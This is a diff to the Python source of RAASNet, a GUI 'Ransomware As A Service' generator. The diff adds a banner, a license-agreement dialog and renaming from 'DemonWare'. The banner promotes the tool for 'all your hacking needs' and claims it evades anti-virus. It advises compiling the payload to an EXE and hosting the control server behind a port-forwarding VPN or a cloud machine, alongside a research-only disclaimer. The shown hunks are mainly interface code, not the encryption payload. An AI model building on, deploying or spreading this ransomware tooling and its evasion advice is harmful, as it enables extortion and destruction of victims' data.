@@ -1,11 +1,49 @@
 #!/usr/bin/env python3
 '''
-Welcome to RAASNet v0.1
+====================================== WELCOME TO RAASNet ==========================================
 
+Your Ransomware As A Service (RAAS) Tool for all your hacking needs.
+
+=========================================== INSTALLATION ===========================================
 To use all features of this software, please do:
 pip3 install -r requirements.txt
 
+=========================================== PLEASE READ ===========================================
+
+This was made to demonstrate ransomware and how easy it is to make.
+It works on Windows, Linux and MacOS.
+It's recommended to compile payload.py to EXE to make it more portable.
+
+I do work on security awareness trainings and test the IT security and safety
+for other companies and you guessed it; this was made for the demo section
+of my presentation, NOT TO EARN MONEY OR BRICK PEOPLES COMPUTERS.
+
+This script does not get detected by any anti-virus.
+Self made scripts go undetected 99% of the time.
+It's easy to write something nasty like ransomware, adware, malware, you name it.
+Again, this script was for research only. Not ment to be used in the open world.
+I am not responsible for any damage you may cause with this knowledge.
+
+I recommend a VPN that allows port forwarding (For example; PIA VPN) when
+using this outside your network, or better,
+a cloud computer hosted elsewhere, like Amazon AWS.
+
+The conclusion of this project is that it is easy to brick a system and earn money doing it.
+This script doesn't use any exploits to achieve its goal,
+but can easily be coded into it as a nice feature.
+
+===================================================================================================
 '''
+
+# Headers
+__author__ = "Leon Voerman"
+__copyright__ = "Copyright 2019, Incoming Security"
+__license__ = "GPLv3"
+__version__ = "1.0.0"
+__maintainer__ = "Leon Voerman"
+__email__ = "I don't need spam, open an issue on GitHub, thank you :)"
+__status__ = "Production"
+
 import os, sys, subprocess, threading, time, datetime, socket, select, PIL.Image, PIL.ImageTk, webbrowser, base64, platform, base64
 from tkinter import *
 from tkinter.ttk import *
@@ -92,6 +130,7 @@ class MainWindow(Tk):
 
         # Input field data is being inserted in this dict
         self.options = {
+            'agreed' : IntVar(),
             'host' : StringVar(),
             'port' : IntVar(),
             'remote' : StringVar(),
@@ -109,6 +148,13 @@ class MainWindow(Tk):
             'new_msg' : StringVar(),
             'img_base64' : StringVar(),
         }
+
+
+        #<activate>
+        #<activate>
+
+        if not self.options['agreed'].get() == 1:
+            self.show_license()
 
         # Default Settings
         self.options['host'].set('127.0.0.1')
@@ -272,7 +318,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         label.image = photo # keep a reference!
         label.grid(row = 0, column = 0, columnspan = 3, rowspan = 4)
 
-        Label(self, text = 'DemonWare Generator', background = 'white', foreground = 'red', font='Helvetica 32 bold').grid(row = 2, column = 3, columnspan = 3)
+        Label(self, text = 'RAASNet Generator', background = 'white', foreground = 'red', font='Helvetica 32 bold').grid(row = 2, column = 3, columnspan = 3)
 
         # Buttons
         start_server = Button(self, text = "START SERVER", command = self.open_server, width = 53).grid(row = 4, column = 0, columnspan = 6)
@@ -489,7 +535,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
             return
 
         self.options['img_base64'].set(f)
-        
+
     def set_msg(self):
         self.message = Toplevel()
         self.message.title(string = 'Set Custom Message')
@@ -663,16 +709,54 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         self.message.destroy()
 
     def open_github(self):
-        webbrowser.open_new_tab('https://www.github.com/leonv024/demon')
+        webbrowser.open_new_tab('https://www.github.com/leonv024/RAASNet')
 
     def exit(self):
         sys.exit(0)
 
     def exit_event(self, event):
-        exit()
+        exit(0)
+
+    def show_license(self):
+        self.withdraw()
+
+        try:
+            license = open('./LICENSE', 'r').read()
+        except FileNotFoundError:
+
+            messagebox.showwarning('ERROR', 'This product comes with a license but the license was not found in your installation directory.\n\nPlease, download this product from the official source only!')
+            sys.exit(1)
+
+        self.lic = Toplevel()
+        self.lic.title(string = 'LICENSE AGREEMENT')
+        self.lic.configure(background = 'white')
+        self.lic.resizable(0,0)
+
+        self.options['license'] = Text(self.lic, height = 25, width = 80)
+        self.options['license'].grid(row = 0, column = 0, columnspan = 2)
+        decline = Button(self.lic, text = 'DECLINE', command = self.decline_license, width = 25).grid(row = 1, column = 0)
+        agree = Button(self.lic, text = 'AGREE', command = self.agree_license, width = 25).grid(row = 1, column = 1)
+
+        self.options['license'].insert('1.0', license)
+
+    def decline_license(self):
+        messagebox.showwarning('DECLINED', 'You rejected the license.\n\nYou are not allowed to use this software.\n\nRelaunch it and click "agree" if you changed your mind.\n\nThis program will now exit... Goodbye!')
+        sys.exit(0)
+
+    def agree_license(self):
+        f = open(sys.argv[0], 'r').read()
+        f = f.replace("#<activate>", "self.options['agreed'].set(1)", 1)
+        with open(sys.argv[0], 'w') as w:
+            w.write(f)
+            w.close()
+
+        self.deiconify()
+        self.lic.destroy()
+
+
 
     def view_license(self):
-        messagebox.showinfo('License', 'Currect license is: Free (Public Test)')
+        messagebox.showinfo('License', 'Software: Free (Public Test)\nLicense: GNU General Public License v3.0')
 
 main = MainWindow()
 main.mainloop()
